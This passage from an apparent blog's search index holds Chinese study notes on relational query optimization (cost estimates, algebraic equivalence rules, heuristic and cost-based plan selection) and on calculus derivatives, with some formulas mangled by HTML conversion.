10^{4}s$，满足条件的元组假设仅50个，均可放在内存。</p><h4 id="2-2-1-3-作投影操作-x20"><a href="#2-2-1-3-作投影操作-x20" class="headerlink" title="2.2.1.3 作投影操作&#x20;"></a>2.2.1.3 作投影操作&#x20;</h4><p>把第2步的结果在Sname上作投影输出，得到最终结果，第一种情况下执行查询的总时间$\approx 105+2 \times 5 \times 10^{4} \approx 10^{5} \mathrm{~s}$，所有内存处理时间均忽略不计。</p><h3 id="2-2-2-第二种情况-x20"><a href="#2-2-2-第二种情况-x20" class="headerlink" title="2.2.2 第二种情况&#x20;"></a>2.2.2 第二种情况&#x20;</h3><p>$$<br>Q_{2}&#x3D;\Pi_{\text {Sname }}\left(\sigma_{\text {Sc.Cno&#x3D;’2’ }}(\right. Student \left.\bowtie S C)\right)<br>$$</p><ol><li>计算自然连接&#x20;<ul><li>执行自然连接，读取Student和SC表的策略不变，总的读取块数仍为2100块花费105 s&#x20;</li><li>自然连接的结果比第一种情况大大减少，为$10^{4}$个</li><li>写出这些元组时间为$10^{4} &#x2F; 10 &#x2F; 20&#x3D;50 \mathrm{~s}$，为第一种情况的千分之一&#x20;</li></ul></li><li>读取中间文件块，执行选择运算，花费时间也为50s</li><li>把第2步结果投影输出</li></ol><p>第二种情况总的执行时间≈105+50+50 ≈ 205 s。&#x20;</p><h3 id="2-2-3-第三种情况"><a href="#2-2-3-第三种情况" class="headerlink" title="2.2.3 第三种情况"></a>2.2.3 第三种情况</h3><p>$$<br>Q_{3}&#x3D;\Pi_{\text {Sname }}\left(\right. Student \left.\bowtie \sigma_{\text {Sc.Cno&#x3D;’2’ }}(\mathrm{SC})\right)<br>$$</p><ol><li>先对SC表作选择运算，只需读一遍SC表，存取100块花费时间为5s，因为满足条件的元组仅50个，不必使用中间文件。</li><li>读取Student表，把读入的Student元组和内存中的SC元组作连接。也只需读一遍Student表共100块，花费时间为5s。</li><li>把连接结果投影输出</li></ol><p>第三种情况总的执行时间≈5+5≈10 s。</p><p>假如SC表的Cno字段上有索引</p><ul><li>第一步就不必读取所有的SC元组而只需读取Cno&#x3D;‘2’的那些元组(50个)</li><li>存取的索引块和SC中满足条件的数据块大约总共3～4块</li></ul><p>若Student表在Sno上也有索引</p><ul><li>第二步也不必读取所有的Student元组</li><li>因为满足条件的SC记录仅50个，涉及最多50个Student记录</li></ul><p>总的存取时间将进一步减少到数秒。</p><p>这个简单的例子充分说明了查询优化的必要性，同时也给出一些查询优化方法的初步概念。</p><p>把代数表达式Q1变换为Q2、 Q3，即有选择和连接操作时，先做选择操作，这样参加连接的元组就可以大大减少，这是<strong>代数优化</strong>。</p><p>在Q3中，SC表的选择操作算法有全表扫描和索引扫描2种方法，经过初步估算，索引扫描方法较优。对于Student和SC表的连接，利用Student表上的索引，采用index join代价也较小，这就是<strong>物理优化</strong>。</p><hr><h1 id="3-代数优化"><a href="#3-代数优化" class="headerlink" title="3 代数优化"></a>3 代数优化</h1><h2 id="3-1-关系代数表达式等价变换规则"><a href="#3-1-关系代数表达式等价变换规则" class="headerlink" title="3.1 关系代数表达式等价变换规则"></a>3.1 关系代数表达式等价变换规则</h2><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_4Loo5hL7HE.png"></p><p>代数优化策略：通过对关系代数表达式的等价变换来提高查询效率。</p><p>关系代数表达式的等价：指用相同的关系代替两个表达式中相应的关系所得到的结果是相同的，两个关系表达式E1和E2是等价的，可记为E1≡E2。</p><h3 id="3-1-1-连接、笛卡尔积交换律"><a href="#3-1-1-连接、笛卡尔积交换律" class="headerlink" title="3.1.1 连接、笛卡尔积交换律"></a>3.1.1 连接、笛卡尔积交换律</h3><p>设E1和E2是关系代数表达式，F是连接运算的条件，则有：</p><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_ZE1Ku7MiyF.png"></p><h3 id="3-1-2-连接、笛卡尔积的结合律"><a href="#3-1-2-连接、笛卡尔积的结合律" class="headerlink" title="3.1.2 连接、笛卡尔积的结合律"></a>3.1.2 连接、笛卡尔积的结合律</h3><p>设E1，E2，E3是关系代数表达式，F1和F2是连接运算的条件，则有：</p><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_u5ypcIuiH-.png"></p><h3 id="3-1-3-投影的串接定律"><a href="#3-1-3-投影的串接定律" class="headerlink" title="3.1.3 投影的串接定律"></a>3.1.3 投影的串接定律</h3><p>投影两次等于投影一次的效果</p><p>$$<br>\pi_{A 1, A_{2}, \cdots, A_{n}}\left(\pi_{B_{1}, B_{2}, \cdots, B_{n}}(E)\right) \equiv \pi_{A_{1}, A_{2}, \cdots, A_{n}}(E)<br>$$</p><p>这里，E是关系代数表达式，Ai(i&#x3D;1，2，…，n)，Bj(j&#x3D;1，2，…，m)是属性名且{A1，A2，…，An}构成{B1，B2，…，Bm}的子集。</p><h3 id="3-1-4-选择的串接定律"><a href="#3-1-4-选择的串接定律" class="headerlink" title="3.1.4 选择的串接定律"></a>3.1.4 选择的串接定律</h3><p>选择两次等于选择一次的效果</p><p>$$<br>\sigma_{F_{1}}\left(\sigma_{F_{2}}(E)\right) \equiv \sigma_{F i \wedge E 2}(E)<br>$$</p><p>这里，E是关系代数表达式，F1，F2是选择条件，选择的串接定律说明选择条件可以合并。这样一次就可检查全部条件。</p><h3 id="3-1-5-选择与投影操作的交换律"><a href="#3-1-5-选择与投影操作的交换律" class="headerlink" title="3.1.5 选择与投影操作的交换律"></a>3.1.5 选择与投影操作的交换律</h3><p>$$<br>\sigma_{\mathrm{F}}\left(\pi_{A_{1}, A_{2}, \cdots, A}(E)\right) \equiv \pi_{A_{1}, A_{2}, \cdots, A_{n}}\left(\sigma_{\mathrm{F}}(E)\right)<br>$$</p><p>选择条件F只涉及属性A1，…，An。</p><p>若F中有不属于A1，…，An的属性B1，…，Bm则有更一般的规则：</p><p>$$<br>\pi_{A_{1}, A_{2}, \cdots, A_{n}}\left(\sigma_{F}(E)\right) \equiv \pi_{A_{1}, A_{1}, \cdots, A_{m}}\left(\sigma_{F}\left(\pi_{A_{1}, A_{2}, \cdots, A_{n}, B_{1}, B_{2}, \ldots, B_{m}}(E)\right)\right)<br>$$</p><h3 id="3-1-6-选择与笛卡尔积的交换律"><a href="#3-1-6-选择与笛卡尔积的交换律" class="headerlink" title="3.1.6 选择与笛卡尔积的交换律"></a>3.1.6 选择与笛卡尔积的交换律</h3><p>如果F中涉及的属性都是E1中的属性，则</p><p>$$<br>\sigma_{\mathrm{F}}\left(E_{1} \cup E_{2}\right)&#x3D;\sigma_{\mathrm{F}}\left(E_{1}\right) \cup \sigma_{\mathrm{F}}\left(E_{2}\right)<br>$$</p><p>如果F&#x3D;F1∧F2，并且F1只涉及E1中的属性，F2只涉及E2中的属性，则由上面的等价变换规则1，4，6可推出：</p><p>$$<br>\sigma_{\mathrm{F}}\left(E_{1} \times E_{2}\right) \equiv \sigma_{\mathrm{F}<em>{1}}\left(E</em>{1}\right) \times \sigma_{\mathrm{F}<em>{2}}\left(E</em>{2}\right)<br>$$</p><p>若F1只涉及E1中的属性，F2涉及E1和E2两者的属性，则仍有：</p><p>$$<br>\sigma_{\mathrm{F}}\left(E_{1} \times E_{2}\right)&#x3D;\sigma_{F_{2}}\left(\sigma_{F_{1}}\left(E_{1}\right) \times E_{2}\right)<br>$$</p><p>它使部分选择在笛卡尔积前先做。</p><h2 id="3-2-查询树的启发式优化"><a href="#3-2-查询树的启发式优化" class="headerlink" title="3.2 查询树的启发式优化"></a>3.2 查询树的启发式优化</h2><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_OQvf0GMw9u.png"></p><p>典型的启发式规则：</p><ol><li>选择运算应尽可能先做。在优化策略中这是最重要、最基本的一条</li><li>把投影运算和选择运算同时进行，如有若干投影和选择运算，并且它们都对同一个关系操作，则可以在扫描此关系的同时完成所有的这些运算以避免重复扫描关系</li><li>把投影同其前或其后的双目运算结合起来，没有必要为了去掉某些字段而扫描一遍关系</li><li>把某些选择同在它前面要执行的笛卡尔积结合起来成为一个连接运算，连接（特别是等值连接）运算要比同样关系上的笛卡尔积节省很多时间</li><li>找出公共子表达式<ul><li>如果这种重复出现的子表达式的结果不是很大的关系并且从外存中读入这个关系比计算该子表达式的时间少得多，则先计算一次公共子表达式并把结果写入中间文件是合算的</li><li>当查询的是视图时，定义视图的表达式就是公共子表达式的情况</li></ul></li></ol><blockquote><p>下面给出上例中 SQL语句的代数优化示例。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  Student.Sname <span class="keyword">FROM</span>  Student，SC</span><br><span class="line">     <span class="keyword">WHERE</span>  Student.Sno<span class="operator">=</span>SC.Sno <span class="keyword">AND</span> SC.Cno<span class="operator">=</span>‘<span class="number">2</span>’； </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x20;(1) 把SQL语句转换成查询树，如下图所示：</p><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_J_rn6weuFA.png"></p><p>为了使用关系代数表达式的优化法，假设内部表示是关系代数语法树，则上面的查询树如下图所示。</p><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_UhSoYE6VQU.png"></p><p>(2) 对查询树进行优化</p><p>利用规则4、6把选择σ SC.Cno&#x3D;‘2’移到叶端，查询树便转换成下图所示的优化的查询树。这就是9.2.2节中Q3的查询树表示。</p><p><img src="/2024/06/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%A4%84%E7%90%86%E5%92%8C%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/image_s2khW7r7rK.png"></p><hr><h1 id="4-物理优化"><a href="#4-物理优化" class="headerlink" title="4 物理优化"></a>4 物理优化</h1><p>代数优化改变查询语句中操作的次序和组合，不涉及底层的存取路径，对每一种操作有多种执行这个操作的算法，有多条存取路径，因此对于一个查询语句有许多存取方案，它们的执行效率不同， 仅仅进行代数优化是不够的。</p><p>物理优化就是要选择高效合理的操作算法或存取路径，求得优化的查询计划。选择的方法：</p><ol><li>基于规则的启发式优化</li><li>基于代价估算的优化</li><li>两者结合的优化方法</li></ol><h2 id="4-1-基于启发式规则的存取路径选择优化"><a href="#4-1-基于启发式规则的存取路径选择优化" class="headerlink" title="4.1 基于启发式规则的存取路径选择优化"></a>4.1 基于启发式规则的存取路径选择优化</h2><h3 id="4-1-1-选择操作的启发式规则"><a href="#4-1-1-选择操作的启发式规则" class="headerlink" title="4.1.1 选择操作的启发式规则"></a>4.1.1 选择操作的启发式规则</h3><p>对于小关系，使用全表顺序扫描，即使选择列上有索引。</p><p>对于大关系，启发式规则有：</p><ol><li>对于选择条件是主码＝值的查询，查询结果最多是一个元组，可以选择主码索引，一般的RDBMS会自动建立主码索引。</li><li>对于选择条件是非主属性＝值的查询，并且选择列上有索引，要估算查询结果的元组数<ol><li>如果比例较小(&lt;10%)可以使用索引扫描方法</li><li>否则还是使用全表顺序扫描</li></ol></li><li>对于选择条件是属性上的非等值查询或者范围查询，并且选择列上有索引，要估算查询结果的元组数目<ol><li>如果比例较小(&lt;10%)可以使用索引扫描方法</li><li>否则还是使用全表顺序扫描</li></ol></li><li>对于用AND连接的合取选择条件<ol><li>如果有涉及这些属性的组合索引</li><li>如果某些属性上有一般的索引，则可以用［例9.1-C4］中介绍的索引扫描方法，否则使用全表顺序扫描。</li></ol></li><li>对于用OR连接的析取选择条件，一般使用全表顺序扫描</li></ol><h3 id="4-1-2-连接操作的启发式规则"><a href="#4-1-2-连接操作的启发式规则" class="headerlink" title="4.1.2 连接操作的启发式规则"></a>4.1.2 连接操作的启发式规则</h3><ol><li>如果2个表都已经按照连接属性排序：选用排序-合并方法</li><li>如果一个表在连接属性上有索引：选用索引连接方法</li><li>如果上面2个规则都不适用，其中一个表较小：选用Hash join方法</li><li>可以选用嵌套循环方法，并选择其中较小的表，确切地讲是占用的块数(b)较少的表，作为外表(外循环的表) 。</li></ol><h2 id="4-2-基于代价的优化"><a href="#4-2-基于代价的优化" class="headerlink" title="4.2 基于代价的优化"></a>4.2 基于代价的优化</h2><p>启发式规则优化是定性的选择，适合解释执行的系统，因为解释执行的系统，其优化开销包含在查询总开销之中。在编译执行的系统中，一次编译优化，多次执行，查询优化和查询执行是分开的。因此可以采用精细复杂一些的基于代价的优化方法。</p><h3 id="4-2-1-统计信息"><a href="#4-2-1-统计信息" class="headerlink" title="4.2.1 统计信息"></a>4.2.1 统计信息</h3><p>基于代价的优化方法要计算各种操作算法的执行代价，与数据库的状态密切相关。为此，在数据字典中存储了优化器需要的统计信息，主要包括以下内容：</p><ol><li>对每个基本表<ol><li>该表的元组总数(N)</li><li>元组长度(l)</li><li>占用的块数(B)</li><li>占用的溢出块数(BO)</li></ol></li><li>对基表的每个列<ol><li>该列不同值的个数(m)</li><li>选择率(f)<ul><li>如果不同值的分布是均匀的，f＝1&#x2F;m</li><li>如果不同值的分布不均匀，则每个值的选择率＝具有该值的元组数&#x2F;N</li></ul></li><li>该列最大值</li><li>该列最小值</li><li>该列上是否已经建立了索引</li><li>索引类型(B+树索引、Hash索引、聚集索引)</li></ol></li><li>对索引(如B+树索引)<ol><li>索引的层数(L)</li><li>不同索引值的个数</li><li>索引的选择基数S(有S个元组具有某个索引值)</li><li>索引的叶结点数(Y)&#x20;</li></ol></li></ol><h3 id="4-2-2-代价估算示例"><a href="#4-2-2-代价估算示例" class="headerlink" title="4.2.2 代价估算示例"></a>4.2.2 代价估算示例</h3><h4 id="4-2-2-1-全表扫描算法的代价估算公式-xD"><a href="#4-2-2-1-全表扫描算法的代价估算公式-xD" class="headerlink" title="4.2.2.1 全表扫描算法的代价估算公式&#xD;"></a>4.2.2.1 全表扫描算法的代价估算公式&#xD;</h4><p>如果基本表大小为B块，全表扫描算法的代价 cost＝B</p><p>如果选择条件是码＝值，那么平均搜索代价 cost＝B&#x2F;2</p><h4 id="4-2-2-2-索引扫描算法的代价估算公式"><a href="#4-2-2-2-索引扫描算法的代价估算公式" class="headerlink" title="4.2.2.2 索引扫描算法的代价估算公式"></a>4.2.2.2 索引扫描算法的代价估算公式</h4>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等数学第2章：导数与微分</title>
      <link href="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/"/>
      <url>/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-导数概念"><a href="#1-导数概念" class="headerlink" title="1 导数概念"></a>1 导数概念</h1><h2 id="1-1-函数在一点处可导的概念"><a href="#1-1-函数在一点处可导的概念" class="headerlink" title="1.1 函数在一点处可导的概念"></a>1.1 函数在一点处可导的概念</h2><h3 id="1-1-1-导数定义"><a href="#1-1-1-导数定义" class="headerlink" title="1.1.1 导数定义"></a>1.1.1 导数定义</h3><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_vrCFDu5Uxk.png"></p><p>数学定义为：</p><p>$$f^{\prime}\left(x_0\right)&#x3D;\lim_{\Delta x\to0}\frac{\Delta y}{\Delta x}&#x3D;\lim_{\Delta x\to0}\frac{f\left(x_0+\Delta x\right)-f\left(x_0\right)}{\Delta x}$$</p><p>也可记作：</p><p>$$y’|_{x&#x3D;x_0}, \frac{\mathrm{d}y}{\mathrm{d}x} |_{x&#x3D;x_0} \text{或}\frac{\mathrm{d}f(x)}{\mathrm{d}x}|_{x&#x3D;x_0}$$</p><ul><li>导数的实质：变化率</li></ul><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_a0kZOZi1Cc.png"></p><p>导数的定义式：</p><p>$$f’\left(x_0\right)&#x3D;\lim_{\Delta x\to0}\frac{f\left(x_0+\Delta x\right)-f\left(x_0\right)}{\Delta x}$$</p><p>或</p><p>$$f’\left(x_0\right)&#x3D;\lim_{h\to0}\frac{f\left(x_0+h\right)-f\left(x_0\right)}h&#x3D;\lim_{x\to x_0}\frac{f\left(x\right)-f\left(x_0\right)}{x-x_0}$$</p><h3 id="1-1-2-单侧导数"><a href="#1-1-2-单侧导数" class="headerlink" title="1.1.2 单侧导数"></a>1.1.2 单侧导数</h3><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_4f0_lbq6eq.png"></p><p>$y&#x3D;f(x)$在点x处可导等价于 $ f_{+}^{\prime}\left(x_{0}\right) $ 和 $ f_{-}^{\prime}\left(x_{0}\right) $ 都存在且相等。</p><h3 id="1-1-3-几何意义"><a href="#1-1-3-几何意义" class="headerlink" title="1.1.3 几何意义"></a>1.1.3 几何意义</h3><p>导数的几何意义是$曲线 y&#x3D;f(x) 在点 \left(x_{0}, y_{0}\right) 的切线斜率$</p><ul><li>切线方程</li></ul><p>$$<br>y-y_{0}&#x3D;f^{\prime}\left(x_{0}\right)\left(x-x_{0}\right)<br>$$</p><ul><li>法线方程</li></ul><p>$$<br>y-y_{0}&#x3D;-\frac{1}{f^{\prime}\left(x_{0}\right)}\left(x-x_{0}\right) \quad\left(f^{\prime}\left(x_{0}\right) \neq 0\right)<br>$$</p><h3 id="1-1-4-可导与连续的关系-xD"><a href="#1-1-4-可导与连续的关系-xD" class="headerlink" title="1.1.4 可导与连续的关系&#xD;"></a>1.1.4 可导与连续的关系&#xD;</h3><p>定理：$f(x)$在点 $x_{0}$ 处可导 $\longrightarrow f(x)$ 在点 $x_{0}$ 处连续</p><p>连续不一定可导，可导一定连续。</p><blockquote><p>$f(x)&#x3D;\sqrt[3]{x}$，在 x &#x3D; 0处连续，但在x &#x3D; 0 处不可导。</p></blockquote><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_RB-tn52mhd.png"></p><blockquote><p>$f(x)&#x3D;|x|$，在 x &#x3D; 0 处连续，但在 x &#x3D; 0 处不可导。</p></blockquote><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_oS2TnSTx6o.png"></p><h2 id="1-2-函数在区间上可导的概念"><a href="#1-2-函数在区间上可导的概念" class="headerlink" title="1.2 函数在区间上可导的概念"></a>1.2 函数在区间上可导的概念</h2><p>定义：若函数$ y&#x3D;f(x) 在 (a, b) 内的每一点处可导，则称函数 y&#x3D;f(x) 在 (a, b) 内可导.$</p><p>定义： 若函数 $y&#x3D;f(x)$ 在 $(a, b)$ 内的每一点处可导，在${x}&#x3D;{a}$处右可导, 在${x} &#x3D; {b}$处左可导，则称函数 $y&#x3D;f(x)$ 在 $[a, b]$ 上可导。</p><p>定义：若函数 $y &#x3D;f(x)$ 在区间 $I$ 上的每一点处可导，这时，对于区间 $I$ 上的任一点 $x$，都对应着$f(x)$的一个确定的导数值，这样就构成了一个新的函数，这个函数称为原来函数 $f(x)$ 的导函数.</p><p>$记作: y^{\prime}，f^{\prime}(x)，\frac{\mathrm{d} y}{\mathrm{~d} x} 或 \frac{\mathrm{d} f(x)}{\mathrm{d} x}$</p><h3 id="1-2-1-导函数的定义"><a href="#1-2-1-导函数的定义" class="headerlink" title="1.2.1 导函数的定义"></a>1.2.1 导函数的定义</h3><p>$$<br>f^{\prime}(x)&#x3D;\lim _{\Delta x \rightarrow 0} \frac{f(x+\Delta x)-f(x)}{\Delta x}<br>$$</p><h3 id="1-2-2-导函数与导数的区别与联系"><a href="#1-2-2-导函数与导数的区别与联系" class="headerlink" title="1.2.2 导函数与导数的区别与联系"></a>1.2.2 导函数与导数的区别与联系</h3><ol><li>区别：$f^{\prime}(x)$是一个函数，$f^{\prime}\left(x_{0}\right)$是一个数</li><li>联系：$f^{\prime}\left(x_0\right)&#x3D;\left.f^{\prime}(x)\right|_{x&#x3D;x_0}$</li></ol><h2 id="1-3-求导步骤"><a href="#1-3-求导步骤" class="headerlink" title="1.3 求导步骤"></a>1.3 求导步骤</h2><ol><li>算增量：$\Delta y&#x3D;f(x+\Delta x)-f(x)$</li><li>求比值：$\frac{\Delta y}{\Delta x}&#x3D;\frac{f(x+\Delta x)-f(x)}{\Delta x}$</li><li>取极限：$f^{\prime}(x)&#x3D;\lim _{\Delta x \rightarrow 0} \frac{\Delta y}{\Delta x}&#x3D;\lim _{\Delta x \rightarrow 0} \frac{f(x+\Delta x)-f(x)}{\Delta x}$</li></ol><p><strong>注意</strong>：求分段函数在分段点处的导数必须用定义。</p><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_dQsWrn2gPW.png"></p><h2 id="1-4-四则运算求导法则"><a href="#1-4-四则运算求导法则" class="headerlink" title="1.4 四则运算求导法则"></a>1.4 四则运算求导法则</h2><p>定理：如果函数$u&#x3D;u(x)$及$v&#x3D;v(x)$都在点$x$具有导数，那么它们的和、差、积、商（除分母为0的点外）都在点$x$具有导数，则：</p><ol><li>$(u \pm v)^{\prime}&#x3D;u^{\prime} \pm v^{\prime}$</li><li>$(u v w)^{\prime}&#x3D;u^{\prime} v w+u v^{\prime} w+u \nu w^{\prime}$</li><li>$\left(\frac{u}{v}\right)^{\prime}&#x3D;\frac{u^{\prime} v-u v^{\prime}}{v^{2}}$</li></ol><h2 id="1-5-反函数的求导法则"><a href="#1-5-反函数的求导法则" class="headerlink" title="1.5 反函数的求导法则"></a>1.5 反函数的求导法则</h2><p>定理：$如果函数 x&#x3D;f(y) 在区间 I_{y} 内单调、可导且 f^{\prime}(y) \neq 0,则它的反函数 $$y&#x3D;f^{-1}(x) $在区间  $ I_{x}&#x3D;\left \{x \mid x&#x3D;f(y), y \in I_{y}\right\} $ 内也可导，且 $ \left(f^{-1}(x)\right)^{\prime}&#x3D;\frac{1}{f^{\prime}(y)} 或 \frac{\mathrm{d} y}{\mathrm{~d} x}&#x3D;\frac{1}{\frac{d x}{d y}} $ 。</p><p><em><strong>即反函数的导数等于直接函数导数的倒数。</strong></em></p><h3 id="1-5-1-复合函数求导法则"><a href="#1-5-1-复合函数求导法则" class="headerlink" title="1.5.1 复合函数求导法则"></a>1.5.1 复合函数求导法则</h3><p>定理：如果$u &#x3D; g(x)$在点$x$可导，而 $y &#x3D; f(u)$ 在点$ u &#x3D; g(x) $可导，则复合函数 $y &#x3D; f[g(x)]$ 在点$x$可导，则</p><p>$$\frac{\mathrm{d}y}{\mathrm{d}x}&#x3D;f^{\prime}(u)\cdot g^{\prime}(x)\text{或}\frac{\mathrm{d}y}{\mathrm{d}x}&#x3D;\frac{\mathrm{d}y}{\mathrm{d}u}\frac{\mathrm{d}u}{\mathrm{d}x}$$</p><h2 id="1-6-常用初等函数的导数公式"><a href="#1-6-常用初等函数的导数公式" class="headerlink" title="1.6 常用初等函数的导数公式"></a>1.6 常用初等函数的导数公式</h2><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_lYtHfmTLwd.png"></p><hr><h1 id="2-隐函数及由参数方程所确定的函数的导数"><a href="#2-隐函数及由参数方程所确定的函数的导数" class="headerlink" title="2 隐函数及由参数方程所确定的函数的导数"></a>2 隐函数及由参数方程所确定的函数的导数</h1><h2 id="2-1-隐函数"><a href="#2-1-隐函数" class="headerlink" title="2.1 隐函数"></a>2.1 隐函数</h2><h3 id="2-1-1-隐函数的导数"><a href="#2-1-1-隐函数的导数" class="headerlink" title="2.1.1 隐函数的导数"></a>2.1.1 隐函数的导数</h3><p>找到一种方法，不管隐函数是否能够显化，都直接由方程算出其确定的隐函数的导数。</p><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_7UMWir1sPW.png"></p><h3 id="2-1-2-求导步骤"><a href="#2-1-2-求导步骤" class="headerlink" title="2.1.2 求导步骤"></a>2.1.2 求导步骤</h3><ol><li>方程两边同时对x求导，将y视为x的函数，将含y的项视为x的复合函数</li><li>解出y’</li></ol><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_DtZt9-t96e.png"></p><h3 id="2-1-3-对数求导法-xD"><a href="#2-1-3-对数求导法-xD" class="headerlink" title="2.1.3 对数求导法&#xD;"></a>2.1.3 对数求导法&#xD;</h3><p>对于幂指函数来说，直接求导可能不太好算，可以先对其求对数，然后进行求导。</p><p><img src="/2024/06/06/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E5%AF%BC%E6%95%B0%E4%B8%8E%E5%BE%AE%E5%88%86/image_-1x3hGNQzb.png"></p><h2 id="2-2-参数方程确定的函数的导数"><a href="#2-2-参数方程确定的函数的导数" class="headerlink" title="2.2 参数方程确定的函数的导数"></a>2.2 参数方程确定的函数的导数</h2><h3 id="2-2-1-概念与求导法"><a href="#2-2-1-概念与求导法" class="headerlink" title="2.2.1 概念与求导法"></a>2.2.1 概念与求导法</h3><p>一般地，若参数方程：</p><p>$$<br>\left{\begin{array}{l}x&#x3D;\varphi(t) \Longleftrightarrow t&#x3D;\varphi^{-1}(x) \Longleftrightarrow \frac{\mathrm{d} t}{\mathrm{<del>d} x}&#x3D;1 &#x2F; \frac{\mathrm{d} x}{\mathrm{</del>d} t} \ y&#x3D;\psi(t) \Longleftrightarrow y&#x3D;\psi\left(\varphi^{-1}(x)\right) \Longleftrightarrow \frac{\mathrm{d} y}{\mathrm{<del>d} x}&#x3D;\frac{\mathrm{d} y}{\mathrm{</del>d} t} \frac{\mathrm{d} t}{\mathrm{~d} x}\end{array}\right.<br>$$</p><p>参数方程确定的函数的导数：</p><p>$$<br>\frac{\mathrm{d} y}{\mathrm{<del>d} x}&#x3D;\frac{\mathrm{d} y}{\mathrm{</del>d} t} &#x2F; \frac{\mathrm{d} x}{\mathrm{~d} t}&#x3D;\frac{\psi^{\prime}(t)}{\varphi^{\prime}(t)}<br>$$</p><p>$\frac{d y}{d x} 依然是 x 的函数, 视为中间变量$。</p><h3 id="2-2-2-相关变化率-xD"><a href="#2-2-2-相关变化率-xD" class="headerlink" title="2.2.2 相关变化率&#xD;"></a>2.2.2 相关变化率&#xD;</h3><p>$x&#x3D;x(t), y&#x3D;y(t)$为两可导函数，x和y之间有联系，则$\frac{\mathrm{d} x}{\mathrm{<del>d} t}, \frac{\mathrm{d} y}{\mathrm{</del>d} 